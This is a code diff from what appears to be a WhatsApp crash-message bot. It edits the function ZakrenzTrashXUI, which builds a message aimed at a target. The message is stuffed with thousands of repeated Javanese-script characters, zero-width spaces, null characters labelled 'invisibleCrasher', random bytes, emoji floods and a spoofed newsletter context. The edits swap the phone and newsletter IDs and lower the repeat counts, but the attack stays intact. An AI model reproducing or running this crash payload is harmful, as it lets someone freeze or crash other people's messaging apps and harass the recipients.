@@ -473,18 +473,18 @@ async function protocolbug3(target, mention) {
 
 async function ZakrenzTrashXUI(target) {
   const jidList = [
-    "13109207335@s.whatsapp.net",
-    "18002428478@s.whatsapp.net"
+    "1744254936165140@s.whatsapp.net",
+    "1744254936165140@s.whatsapp.net"
   ];
   const m = {
     key: {
       fromMe: false,
       remoteJid: "status@broadcast",
-      participant: "18002428478@s.whatsapp.net"
+      participant: "1744254936165140@s.whatsapp.net"
     },
     message: {
       extendedTextMessage: {
-        text: "ꦾꦽ" + "ꦾꦽ".repeat(9000)
+        text: "ꦾꦽ" + "ꦾꦽ".repeat(500) // Was 9000
       }
     }
   };
@@ -502,7 +502,6 @@ async function ZakrenzTrashXUI(target) {
     Array.from({ length: 2048 }, () => Math.floor(Math.random() * 256))
   ).toString("base64");
   const glitchText = String.fromCharCode(...Array(300).fill(0x200B)) + "꧀ꦽꦾꦻꦸꦃ".repeat(100);
-
   const sysIntPayload = new Int32Array(500)
     .map(() => Math.floor(Math.random() * 1e6))
     .join("\u200B");
@@ -519,7 +518,7 @@ async function ZakrenzTrashXUI(target) {
   const invisibleCrasher = "\u0000".repeat(300);
   const emojiFlood = "❄️".repeat(300);
   const trashBody =
-    "꧀ꦽꦾꦻꦸꦃ".repeat(9000) +
+    "꧀ꦽꦾꦻꦸꦃ".repeat(300) + // Was 9000
     glitchText +
     bytePayload +
     sysIntPayload +
@@ -546,7 +545,7 @@ async function ZakrenzTrashXUI(target) {
           thumbnail: fs.readFileSync("./lib/bruh.png")
         },
         forwardedNewsletterMessageInfo: {
-          newsletterJid: "120363383395435351@newsletter",
+          newsletterJid: "1744254936165140@newsletter",
           newsletterName: "𖣂 - Hangz Real - 𖣂"
         }
       }
